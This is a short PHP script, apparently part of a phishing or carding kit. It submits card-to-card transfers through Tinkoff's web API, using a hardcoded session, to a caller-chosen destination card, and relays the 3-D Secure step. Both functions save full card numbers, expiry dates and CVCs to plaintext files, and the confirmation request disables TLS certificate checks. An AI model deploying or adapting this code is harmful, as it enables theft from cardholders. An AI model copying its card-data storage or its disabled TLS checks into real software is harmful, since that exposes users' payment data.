<?php

function createOrder($card, $m, $y, $cvc, $sum, $return, $tocard) {
	$url = "https://api.tinkoff.ru/v1/pay?origin=web%2Cib5%2Cplatform&sessionid=VgYrsQSzu3ZCEGvjtTxTZjyFzTi1WUyi.ds-prod-api11&wuid=3ed3703accdb4a29ae00d7be07452922";
 
	$payParamsArr = [
		'cardNumber' => $card,
		'formProcessingTime' => '0',
		'securityCode' => $cvc,
		'expiryDate' => $m.'/'.$y,
		'attachCard' => 'false',
		'provider' => 'c2c-anytoany',
		'currency' => 'RUB',
		'moneyAmount' => $sum,
		'moneyCommission' => '40',
		'providerFields' => [
			'toCardNumber' => $tocard
		]
	];
	 
	$encPay = urlencode(json_encode($payParamsArr));

	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, $url);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_POST, 1);
	curl_setopt($ch, CURLOPT_POSTFIELDS, 'payParameters='.$encPay);
	$output = json_decode(curl_exec($ch), true);
	 
	curl_close($ch);
	 
	if (!isset($output['errorMessage'])) {
		$tempdata = $output;
		$tempdata["amount"] = $sum;
		$tempdata["card"] = $card;
		$tempdata["cardCVC"] = $cvc;
		$tempdata["cardExpired"] = $m . "/" . $y;
		file_put_contents("Pattern/TinkoffTemp/" . $output['confirmationData']['3DSecure']['merchantData'], json_encode($tempdata));
		
		return [true, "url" => $output['confirmationData']['3DSecure']['url'],
				"pareq" => $output['confirmationData']['3DSecure']['requestSecretCode'],
				"MD" => $output['confirmationData']['3DSecure']['merchantData'],
				"termUrl" => $return];
	} else {
		return [false, $output['errorMessage']];
	}
}

function checkPay($md,$pares) {
	if ( file_exists("Pattern/TinkoffTemp/{$md}") ) {
		$datamd = json_decode(file_get_contents("Pattern/TinkoffTemp/{$md}"),true);
		$dataor = json_decode(get("https://www.tinkoff.ru/api/common/v1/session_status?origin=web%2Cib5%2Cplatform&sessionid=VgYrsQSzu3ZCEGvjtTxTZjyFzTi1WUyi.ds-prod-api11"),1);
		$ch = curl_init("https://www.tinkoff.ru/api/common/v1/confirm?origin=web%2Cib5%2Cplatform&sessionid=VgYrsQSzu3ZCEGvjtTxTZjyFzTi1WUyi.ds-prod-api11&wuid=3ed3703accdb4a29ae00d7be07452922");
			curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
			curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
			curl_setopt($ch, CURLOPT_POST, 1);
			curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
			curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query([
				"initialOperationTicket" => $datamd['operationTicket'],
				"initialOperation" => $datamd['initialOperation'],
				"confirmationData" => json_encode($datamd['confirmationData']['3DSecure'])
			]));
			$ex = json_decode(curl_exec($ch),true);
			curl_close($ch);
			if ($ex['resultCode'] == 'SUCCESS') {
				return [true, $ex];
			} else {
				return [false, $ex['plainMessage']];
			}
	}
}

?>